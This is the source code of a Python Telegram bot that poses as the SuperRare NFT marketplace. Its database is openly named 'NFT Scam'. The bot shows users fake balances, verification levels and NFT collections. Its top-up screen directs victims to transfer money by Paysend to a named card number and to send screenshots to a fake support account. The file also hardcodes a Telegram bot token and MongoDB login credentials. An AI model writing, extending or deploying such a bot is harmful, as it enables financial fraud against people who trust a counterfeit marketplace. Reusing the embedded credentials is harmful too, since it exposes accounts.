import asyncio
import logging
from aiogram.handlers import InlineQueryHandler
from aiogram import Bot, Dispatcher, Router, types
from aiogram.filters import Command
from aiogram.types import Message,InlineKeyboardMarkup,InlineKeyboardButton
from aiogram.types import CallbackQuery
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup,ReplyKeyboardMarkup,KeyboardButton
from quickdb_Help import MONGODB
from aiogram.types import InputMediaPhoto,InputFile
import requests
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.types import FSInputFile,InputMedia,InputMediaPhoto
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from datetime import datetime
from pytz import timezone
from aiogram.utils.keyboard import InlineKeyboardBuilder
import requests # Модуль для обработки URL
from bs4 import BeautifulSoup # Модуль для работы с HTML
import time # Модуль для остановки программы
import smtplib # Модуль для работы с почтой
class Currency:
	# Ссылка на нужную страницу
	
	# Заголовки для передачи вместе с URL
	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'}

	current_converted_price = 0
	difference = 5 # Разница после которой будет отправлено сообщение на почту

	def __init__(self,count:str):
		# Установка курса валюты при создании объекта
		self.count = count.replace(',','.')  # замена запятых на точки
	def get_currency_price(self):
		DOLLAR_UAH= 'https://www.google.com/search?q='+self.count+'+%D0%B4%D0%BE%D0%BB%D0%BB%D0%B0%D1%80%D0%BE%D0%B2+%D0%B2+%D0%B3%D1%80%D0%B8%D0%B2%D0%BD%D1%8B&sxsrf=APwXEdfYjTBYMsqgvODt5QrAhokVTHdeaA%3A1680021614462&ei=bhgjZLDgG46rrgS_iZfgCQ&ved=0ahUKEwiwz62ciP_9AhWOlYsKHb_EBZwQ4dUDCA8&uact=5&oq=17+%D0%B4%D0%BE%D0%BB%D0%BB%D0%B0%D1%80%D0%BE%D0%B2+%D0%B2+%D0%B3%D1%80%D0%B8%D0%B2%D0%BD%D1%8B&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIICAAQBxAeEA8yBggAEAcQHjIHCAAQDRCABDIKCAAQBRAHEB4QDzIICAAQBRAeEA8yCAgAEAUQHhAPMggIABAIEB4QDzoNCAAQRxDWBBDJAxCwAzoKCAAQRxDWBBCwAzoLCAAQigUQkgMQsAM6CggAEIoFELADEEM6DQgAEOQCENYEELADGAE6FQguEIoFEMcBENEDEMgDELADEEMYAjoKCAAQCBAHEB4QDzoMCAAQCBAHEB4QDxAKOgYIABAeEA9KBAhBGABQxwNYkC9gkTNoAXABeACAAesBiAH2BZIBBTUuMS4xmAEAoAEByAERwAEB2gEGCAEQARgJ2gEGCAIQARgI&sclient=gws-wiz-serp'
		# Парсим всю страницу
		DOLLAR_RUB= 'https://www.google.com/search?q='+self.count+'+%D0%B4%D0%BE%D0%BB%D0%BB%D0%B0%D1%80%D0%B0+%D0%BA+%D1%80%D1%83%D0%B1%D0%BB%D1%8E&sxsrf=APwXEdfKgoGgebec-WrtHHYffAlMJIcAQA%3A1680080746085&ei=av8jZMPCBI-R9u8Pq4Kh8AY&ved=0ahUKEwjDn8HA5ID-AhWPiP0HHStBCG4Q4dUDCA8&uact=5&oq=3+%D0%B4%D0%BE%D0%BB%D0%BB%D0%B0%D1%80%D0%B0+%D0%BA+%D1%80%D1%83%D0%B1%D0%BB%D1%8E&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIGCAAQCBAeMgYIABAIEB4yBggAEAgQHjIGCAAQCBAeMgYIABAIEB4yBggAEAgQHjIGCAAQCBAeMgYIABAIEB4yBggAEAgQHjIGCAAQCBAeOgoIABBHENYEELADOgUIABCiBEoECEEYAFCTB1igFmChF2gBcAF4AIABoQGIAcIEkgEDMi4zmAEAoAEByAEIwAEB&sclient=gws-wiz-serp'
		full_page = requests.get(DOLLAR_UAH, headers=self.headers)
		full_page2 = requests.get(DOLLAR_RUB, headers=self.headers)

		# Разбираем через BeautifulSoup
		soup = BeautifulSoup(full_page.content, 'html.parser')
		soup2 = BeautifulSoup(full_page2.content, 'html.parser')
		# Получаем нужное для нас значение и возвращаем его
		convert = soup.findAll("span", {"class": "DFlfde", "class": "SwHCTb", "data-precision": 2})
		convert2 = soup2.findAll("span", {"class": "DFlfde", "class": "SwHCTb", "data-precision": 2})
		return [convert[0].text,convert2[0].text]
	def uah(self):
		currency = self.get_currency_price()[0]
		currency2 = self.get_currency_price()[1]
		return currency
	def rub(self):
		currency = self.get_currency_price()[0]
		currency2 = self.get_currency_price()[1]
		return currency2
class MyInputFile(InputFile):
    def __init__(self, file_path):
        super().__init__(file_path)
        self._file = open(file_path, 'rb')

    def read(self):
        return self._file.read()

    def close(self):
        self._file.close()

db = MONGODB(
    mongouri="mongodb://mongo:0cYDn1eBCEXPj8xmE8CI@containers-us-west-148.railway.app:5758",
    collection="НФТ Скам",
    db="Скам"
              )

def send_photo(path,chat_id,image_caption=""):
    data = {
    "chat_id": chat_id, 
    "caption": image_caption,
    'parse_mode':'HTML'
    }
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto" 
    with open(path, "rb") as image_file:
        r = requests.post(url, data=data, files={"photo": image_file})






# Create the keyboard with the buttons
support = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='👨🏻‍💻 Тех. Поддержка', url="https://t.me/SuperRare_Supporting")],[InlineKeyboardButton(text='⬅️ Вернутся в ЛК', callback_data="back")]])
keyboard = ReplyKeyboardMarkup(
    keyboard=[
     [KeyboardButton(text="Личный кабинет📖")],
     [KeyboardButton(text="NFT 🖼")], 
     [KeyboardButton(text="Info ℹ️"),
      KeyboardButton(text="Тех. Поддержка 👨🏻‍💻")],],

    
    resize_keyboard=True,
    row_width=3
)

TOKEN = "5647489863:AAERxmr3psaLqUJy-V-IsTeCdxuoopIX1zU"
punks = db.get(f'Cryptopunks') or 3
Kitties = db.get(f'CryptoKitties') or 6
Skellies = db.get(f'Skellies') or 6
Hasbulla = db.get(f'Hasbulla') or 6 
Yacht = db.get(f' Yacht') or 6 
Just = db.get(f'Just') or 6
Cowboy = db.get(f'Cowboy') or 6
Cowboy = db.get(f'Cowboy') or 6
Plague = db.get(f'Plague') or 6
Royals = db.get(f'Royals') or 6
Lazy = db.get(f'Lazy') or 6
Helions = db.get(f'Helions') or 6
Labs =  db.get(f'Labs') or 6
Bohemia = db.get(f'Bohemia') or 6
collection = InlineKeyboardMarkup(inline_keyboard=[
   [InlineKeyboardButton(text=f'Cryptopunks ({punks})', callback_data="Cryptopunks")],
   [InlineKeyboardButton(text=f'CryptoKitties  ({Kitties})', callback_data="CryptoKitties")],
   [InlineKeyboardButton(text=f'Skellies ({Skellies})', callback_data="Skellies")],
   [InlineKeyboardButton(text=f'Crypto Hasbulla ({Hasbulla})', callback_data="Hasbulla")],
   [InlineKeyboardButton(text=f'Bored Ape Yacht Club ({Yacht})', callback_data="Yacht")],
   [InlineKeyboardButton(text=f'Just Ape. ({Just})', callback_data="Just")],
   [InlineKeyboardButton(text=f'Crypto Cowboy Country ({Cowboy})', callback_data="Cowboy")],
   [InlineKeyboardButton(text=f'The Plague NFT ({Plague})', callback_data="Plaguey")],
   [InlineKeyboardButton(text=f'Eternal Royals Official ({Royals})', callback_data="Royals")],
   [InlineKeyboardButton(text=f'Lazy Lions ({Lazy})', callback_data="Lazy")],
   [InlineKeyboardButton(text=f'Helions ({Helions})', callback_data="Helions")],
   [InlineKeyboardButton(text=f'Sensei  Labs ({Labs})', callback_data="Sensei")],
   [InlineKeyboardButton(text=f'Bohemia ({Bohemia })', callback_data="Bohemia ")],
   [InlineKeyboardButton(text='⬅️ Вернутся в ЛК', callback_data="back")]
   ]
   )

send = InlineKeyboardMarkup(inline_keyboard=[
   [InlineKeyboardButton(text='⬅️ Вернутся в ЛК', callback_data="back")]])

menu =ReplyKeyboardMarkup(
    keyboard=[
     [KeyboardButton(text="Вывести 📤")],
     [KeyboardButton(text="Пополнить 📥")], 
     [KeyboardButton(text="Мои NFT 💵"),
      KeyboardButton(text="Сменить валюту 🖼")]],

    
    resize_keyboard=True,
    row_width=3
)
button1 = InlineKeyboardButton(text='Принять Пользовательское соглашение ✅', callback_data='accept')
language_1 = InlineKeyboardButton(text='English 🇺🇸', callback_data='en')
language_2 = InlineKeyboardButton(text='Russian 🇷🇺', callback_data='ru')
money_ru = InlineKeyboardButton(text='RUB 🇷🇺', callback_data='rub')
money_UAH = InlineKeyboardButton(text='UAH 🇺🇦', callback_data='uah')
money_en = InlineKeyboardButton(text='USD 🇺🇸', callback_data='usd')
format = "%Y.%m.%d %H:%M"
language = [language_1,language_2]
row1 = [button1]
button_list = [row1]
money_list =[money_ru,money_en,money_UAH]
markup = InlineKeyboardMarkup(inline_keyboard=[language])
inline_kb = InlineKeyboardMarkup(inline_keyboard=button_list)
money = InlineKeyboardMarkup(inline_keyboard=[money_list])
button_8043 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='⬅️ Вернутся в ЛК', callback_data="back")],[InlineKeyboardButton(text='✅ Купить', callback_data="buy_8043")]])
menu = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='Пополнить 📥', callback_data='пополнить'),InlineKeyboardButton(text='Вывести 📤', callback_data='Вывести')],[InlineKeyboardButton(text="Мои NFT 💵",callback_data="My_NFT")],[InlineKeyboardButton(text="Сменить валюту 🖼",callback_data="money")]])
info = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='👨🏻‍💻 Тех. Поддержка', url="https://t.me/SuperRare_Supporting")],[InlineKeyboardButton(text='Сообщить об ошибке', url="https://t.me/SuperRare_Supporting")]])
router = Router()
bot = Bot(TOKEN, parse_mode="HTML")
dp = Dispatcher()


@router.message(Command(commands=["start"]))
async def command_start_handler(message: Message) -> None:
 """ if db.get(f'язык_{message.chat.id}') is None:"""
 if db.get(f'money_{message.chat.id}') is None:
  await bot.send_message(chat_id=message.chat.id,text="""<b>en : Choose language\n\nru : Выберете язык </b>""", reply_markup=markup)
 else:
    await bot.send_message(chat_id=message.chat.id,text="✅",reply_markup = keyboard)
    await bot.send_photo(chat_id=message.chat.id, photo=FSInputFile("НФТ бот/Личка.jpg"),caption=f"<b>Личный кабинет</b>\n\nБаланс : <b>{db.get(f'money_count_{message.chat.id}') or '0.0'} {db.get(f'money_{message.chat.id}')}</b>\nНа выводе : <b>{db.get(f'вывод_{message.chat.id}') or '0.0'} {db.get(f'money_{message.chat.id}')}</b>\n\nУровень Верификации : {db.get(f'verif_{message.chat.id}') or '⚠️ Не верифицирован'}\nВаш ID : <b>{message.chat.id}</b>\n\nВремя Регистрации : <b>{db.get(f'time_{message.chat.id}')}</b>", reply_markup=menu)

#await message.answer("""<b>Пользовательское соглашение “SuperRare” 📚 </b>\n\n<a href='https://telegra.ph/Polzovatelskoe-soglashenie-SuperRare-03-23'>Политика и условия пользования данным ботом, пожалуйста, прочитайте их прежде тем как использовать бота</a>""", reply_markup=inline_kb)
@router.callback_query()
async def my_handler(query: CallbackQuery):
   crypton_button = InlineKeyboardBuilder()
   now_utc = datetime.now(timezone('UTC'))
   price_8984 = db.get(f'price_8984') or "4.697.03"
   Cryptopunks_button = InlineKeyboardBuilder() 
   now_Moscow = now_utc.astimezone(timezone('Europe/Moscow'))
   if query.data == "Cryptopunks":
      Cryptopunks_count = 0
      if db.get(f'CryptoPunk #8984_{query.message.chat.id}') is None:
          Cryptopunks_count += 1
      if db.get(f'CryptoPunk #1084_{query.message.chat.id}') is None:
          crypton_button.button(text=f'CryptoPunk #1084 (≈ ₽{Currency(db.get(f"CryptoPunk #1084_price") or str(94)).rub()})',callback_data='#1084')
          
          Cryptopunks_count += 1
      if db.get(f'CryptoPunk #8043_{query.message.chat.id}') is None:Cryptopunks_count += 1  
      await bot.edit_message_caption(chat_id=query.message.chat.id,
                                     message_id=query.message.message_id,
                                     caption=f"<b>💠 Коллекция Cryptopunks\n\n</b>Токенов в коллекции: {Cryptopunks_count or 0}",
                                     reply_markup=crypton_button.as_markup())

   if query.data == "#8043":
       await bot.delete_message(chat_id=query.message.chat.id,message_id=query.message.message_id)   #👩‍💻 Автор: C352B5
       await bot.send_photo(chat_id=query.message.chat.id, photo=FSInputFile("НФТ бот/NFT/1 nft.jpg"),caption=f"💠 Токен <b>CryptoPunk #8043</b>\n\n🗂 Коллекция: Cryptopunks\n👩‍💻 Автор: C352B5\n🔹 Блокчейн: Ethereum\n\n💸 Цена: ${db.get(f'CryptoPunk #1084_price') or str(3,877.53)} (~ {Currency(db.get(f'CryptoPunk #1084_price') or str(3,877.53)).rub()}₽)", reply_markup=button_8043)

   if query.data == "пополнить":
       await bot.delete_message(chat_id=query.message.chat.id,message_id=query.message.message_id)
       await bot.send_photo(chat_id=query.message.chat.id, photo=FSInputFile("НФТ бот/super.webp"),caption=f"<b>Оплата через Международный Перевод</b>\n\nДля пополнения счета через международный перевод воспользуйтесь одним из сервисов:\n- <a href='https://paysend.com/'>Paysend</a>\n\nСтрана отправитель: Ваша страна\nСтрана получатель: Украина\nКарта получателя: 5355280017036524\nИмя получателя: Looks Rare\n\n\nПосле внесения средств отправьте скриншот перевода в службу технической поддержки, и средства будут зачислены на ваш счет.", reply_markup=send)
   if query.data == "ru":
      db.set(f'language_{query.message.chat.id}','ru')
      await bot.edit_message_text(chat_id=query.message.chat.id,message_id=query.message.message_id,text="<b>💲Выберете валюты</b>",reply_markup=money)
   if query.data == "rub":
      await bot.send_message(chat_id=query.message.chat.id,text="✅",reply_markup = keyboard)
      await bot.delete_message(chat_id=query.message.chat.id,message_id=query.message.message_id)
      db.set(f'time_{query.message.chat.id}',now_Moscow.strftime(format))
      db.set(f'money_{query.message.chat.id}','RUB') # FSInputFile("C:/Users/Администратор/OneDrive/Рабочий стол/заказы/НФТ бот/u.png")
      await bot.send_photo(chat_id=query.message.chat.id, photo=FSInputFile("НФТ бот/Личка.jpg"),caption=f"<b>Личный кабинет</b>\n\nБаланс : <b>{db.get(f'money_count_{query.message.chat.id}') or '0.0'} {db.get(f'money_{query.message.chat.id}')}</b>\nНа выводе : <b>{db.get(f'вывод_{query.message.chat.id}') or '0.0'} {db.get(f'money_{query.message.chat.id}')}</b>\n\nУровень Верификации : {db.get(f'verif_{query.message.chat.id}') or '⚠️ Не верифицирован'}\nВаш ID : <b>{query.message.chat.id}</b>\n\nВремя Регистрации : <b>{db.get(f'time_{query.message.chat.id}')}</b>", reply_markup=menu)
   if query.data == "accept":
      await bot.edit_message_text(chat_id=query.message.chat.id,message_id=query.message.message_id,text="<b>Вы успешно приняли пользовательское соглашение,через 2 секунды даное сообщение будет изменено валюты</b>")
      await asyncio.sleep(2)
      await bot.edit_message_text(chat_id=query.message.chat.id,message_id=query.message.message_id,text="<b>Главное меню</b>")
   if query.data == "back":
      await bot.delete_message(chat_id=query.message.chat.id,message_id=query.message.message_id)
      await bot.send_photo(chat_id=query.message.chat.id, photo=FSInputFile("НФТ бот/Личка.jpg"),caption=f"<b>Личный кабинет</b>\n\nБаланс : <b>{db.get(f'money_count_{query.message.chat.id}') or '0.0'} {db.get(f'money_{query.message.chat.id}')}</b>\nНа выводе : <b>{db.get(f'вывод_{query.message.chat.id}') or '0.0'} {db.get(f'money_{query.message.chat.id}')}</b>\n\nУровень Верификации : {db.get(f'verif_{query.message.chat.id}') or '⚠️ Не верифицирован'}\nВаш ID : <b>{query.message.chat.id}</b>\n\nВремя Регистрации : <b>{db.get(f'time_{query.message.chat.id}')}</b>", reply_markup=menu)
   print(query.message.chat.id)
   print(query.data)


@router.message()
async def command_start_handler(message: Message) -> None:
 """ if db.get(f'язык_{message.chat.id}') is None:"""
 print(message.text)
 if message.text == "Личный кабинет📖":
     await bot.send_photo(chat_id=message.chat.id, photo=FSInputFile("НФТ бот/Личка.jpg"),caption=f"<b>Личный кабинет</b>\n\nБаланс : <b>{db.get(f'money_count_{message.chat.id}') or '0.0'} {db.get(f'money_{message.chat.id}')}</b>\nНа выводе : <b>{db.get(f'вывод_{message.chat.id}') or '0.0'} {db.get(f'money_{message.chat.id}')}</b>\n\nУровень Верификации : {db.get(f'verif_{message.chat.id}') or '⚠️ Не верифицирован'}\nВаш ID : <b>{message.chat.id}</b>\n\nВремя Регистрации : <b>{db.get(f'time_{message.chat.id}')}</b>", reply_markup=menu)
 if message.text == "Info ℹ️":
    await bot.send_photo(chat_id=message.chat.id, photo=FSInputFile("НФТ бот/инфо.jpg"),caption=f"<b>🔹 О Сервисе</b>\n\nSuperRare - <b>торговая площадка для невзаимозаменяемых токенов (NFT). Покупайте, продавайте и открывайте для себя эксклюзивные цифровые предметы.</b>", reply_markup=info)
 if message.text == "Тех. Поддержка 👨🏻‍💻":
    await bot.send_photo(chat_id=message.chat.id, photo=FSInputFile("НФТ бот/сап.jpg"),caption=f"<b>Правила</b> обращения в Техническую Поддержку:\n\n🔹1. <b>Представьтесь, изложите проблему своими словами</b> - мы постараемся Вам помочь.\n\n🔹2. <b>Напишите свой ID</b> - нам это нужно, чтобы увидеть ваш профиль, и узнать актуальность вашей проблемы.\n\n🔹3. <b>Будьте вежливы, наши консультанты не роботы, мы постараемся помочь Вам, и сделать все возможное, чтобы сберечь ваше время и обеспечить максимальную оперативность в работе.</b>\n\nНапишите нам, ответ Поддержки, не заставит вас долго ждать!", reply_markup=support)
 if message.text == "NFT 🖼":
    await bot.send_photo(chat_id=message.chat.id, photo=FSInputFile("НФТ бот/нфт.jpg"),caption=f"<b>💠 There are 13 collections on the marketplace</b>", reply_markup=collection)



async def main() -> None:
    # Dispatcher is a root router
    # ... and all other routers should be attached to Dispatcher
    dp.include_router(router)

    # Initialize Bot instance with a default parse mode which will be passed to all API calls
    bot = Bot(TOKEN, parse_mode="HTML")
    # And the run events dispatching
    await dp.start_polling(bot)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())